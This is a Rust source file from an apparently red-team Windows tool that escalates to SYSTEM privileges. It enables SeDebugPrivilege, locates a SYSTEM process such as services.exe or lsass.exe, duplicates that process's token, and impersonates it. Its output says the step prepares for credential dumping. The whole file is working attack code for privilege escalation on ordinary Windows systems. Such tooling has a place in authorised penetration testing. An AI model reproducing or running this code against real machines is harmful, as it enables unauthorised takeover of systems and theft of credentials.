//! SYSTEM privilege escalation - Fixed version

use crate::error::MemoricError;
use crate::safe_handle::SafeHandle;
use serde_json::Value;

/// Elevate to SYSTEM using token duplication
pub fn elevate_to_system(_args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::Foundation::HANDLE;
    use windows::Win32::Security::{
        DuplicateTokenEx, ImpersonateLoggedOnUser, RevertToSelf, SECURITY_ATTRIBUTES,
        SECURITY_IMPERSONATION_LEVEL, TOKEN_ACCESS_MASK, TOKEN_TYPE,
    };
    use windows::Win32::System::Threading::{
        OpenProcess, OpenProcessToken, PROCESS_QUERY_INFORMATION,
    };

    tracing::warn!("[REDTEAM] Attempting SYSTEM elevation via token duplication");

    unsafe {
        // First enable SeDebugPrivilege
        if let Err(e) = crate::privilege::enable_debug_privilege(&serde_json::json!({})) {
            tracing::warn!("Failed to enable SeDebugPrivilege: {}", e);
        }

        // Find a SYSTEM process (services.exe is usually SYSTEM)
        let system_pid = find_system_process()?;
        tracing::debug!("Found SYSTEM process: {}", system_pid);

        // Open SYSTEM process
        let process_handle =
            OpenProcess(PROCESS_QUERY_INFORMATION, false, system_pid).map_err(|e| {
                MemoricError::WindowsApi(format!(
                    "Failed to open SYSTEM process: {}. Make sure SeDebugPrivilege is enabled.",
                    e
                ))
            })?;
        let process_handle = SafeHandle::new(process_handle);

        // Open process token
        let mut token_handle = HANDLE::default();
        OpenProcessToken(
            *process_handle,
            TOKEN_ACCESS_MASK(0x0002 | 0x0008),
            &mut token_handle,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to open token: {}", e)))?;
        let token_handle = SafeHandle::new(token_handle);

        // Duplicate the token
        let mut duplicated_token = HANDLE::default();
        let sa = SECURITY_ATTRIBUTES {
            nLength: std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32,
            lpSecurityDescriptor: std::ptr::null_mut(),
            bInheritHandle: true.into(),
        };

        DuplicateTokenEx(
            *token_handle,
            TOKEN_ACCESS_MASK(0x0002 | 0x0008 | 0x0001),
            Some(&sa),
            SECURITY_IMPERSONATION_LEVEL(2), // SecurityImpersonation
            TOKEN_TYPE(1),                   // TokenPrimary
            &mut duplicated_token,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to duplicate token: {}", e)))?;
        let duplicated_token = SafeHandle::new(duplicated_token);

        // Impersonate briefly to verify token works, then revert immediately.
        // We MUST revert before returning because the Named Pipe connection
        // was established under the original (admin) token. If we leave the
        // SYSTEM impersonation active, all subsequent pipe I/O will fail
        // with ERROR_PIPE_ENDED because the security context has changed.
        ImpersonateLoggedOnUser(*duplicated_token)
            .map_err(|e| MemoricError::WindowsApi(format!("Failed to impersonate: {}", e)))?;

        // Verify we're running as SYSTEM
        tracing::info!("Successfully impersonated SYSTEM token (reverting to preserve pipe)");

        // CRITICAL: Revert to original token so the pipe stays alive
        RevertToSelf().map_err(|e| MemoricError::WindowsApi(format!("Failed to revert: {}", e)))?;

        tracing::info!("Reverted to original token. SYSTEM token duplication verified.");

        Ok(serde_json::json!({
            "success": true,
            "message": "SYSTEM token duplicated and verified. Token impersonation works but was reverted to preserve IPC pipe. Use this before dump_credentials or other SYSTEM-level operations.",
            "source_pid": system_pid,
            "note": "The Worker process has verified SYSTEM token access. Individual tools that need SYSTEM will re-impersonate as needed."
        }))
    }
}

/// Find a SYSTEM process
fn find_system_process() -> Result<u32, MemoricError> {
    use windows::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
        TH32CS_SNAPPROCESS,
    };

    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
            .map_err(|e| MemoricError::WindowsApi(format!("Failed to create snapshot: {}", e)))?;
        let _snapshot = SafeHandle::new(snapshot);

        let mut entry = PROCESSENTRY32W {
            dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
            ..Default::default()
        };

        let targets = ["services.exe", "lsass.exe", "wininit.exe", "winlogon.exe"];

        if Process32FirstW(*_snapshot, &mut entry).is_ok() {
            loop {
                let name = String::from_utf16_lossy(&entry.szExeFile)
                    .trim_end_matches('\0')
                    .to_string();
                for &target in &targets {
                    if name == target {
                        return Ok(entry.th32ProcessID);
                    }
                }
                if Process32NextW(*_snapshot, &mut entry).is_err() {
                    break;
                }
            }
        }
    }

    Err(MemoricError::PermissionDenied(
        "No suitable SYSTEM process found".to_string(),
    ))
}
